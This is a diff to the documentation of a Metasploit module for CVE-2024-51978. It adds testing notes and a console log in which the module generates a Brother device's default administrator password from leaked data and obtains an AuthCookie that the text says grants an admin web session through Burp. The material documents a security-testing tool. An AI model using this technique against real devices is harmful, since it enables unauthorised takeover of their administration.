@@ -5,6 +5,11 @@ administrator password. The target device may leak its serial number via unauthe
 SNMP, or PJL requests.
 
 ## Testing
+Run the module against a vulnerable device (full list [here](https://www.cve.org/CVERecord?id=CVE-2024-51978)).
+If the default password is correctly generated, the module will be able to verify this. 
+
+The module will also report an HTTP cookie `AuthCookie` which can be used, for example via Burp's proxy feature, to
+get access to an administrator session on the target devices web interface.
 
 ## Verification Steps
 
@@ -83,6 +88,7 @@ msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > ru
 [*] Generating default password with salt lookup index 254 and salt data 7HOLDhk'
 [*] Generated password value: r/5LM&U>
 [*] Attempting to validate password
+[*] Received an AuthCookie value: bi56MaYmMOhcwuH8miqCW5YvSGqKRqr8EOgiAr0yA20%3D
 [+] Successfully validated the administrator password: r/5LM&U>
 [*] Auxiliary module execution completed
 msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) >
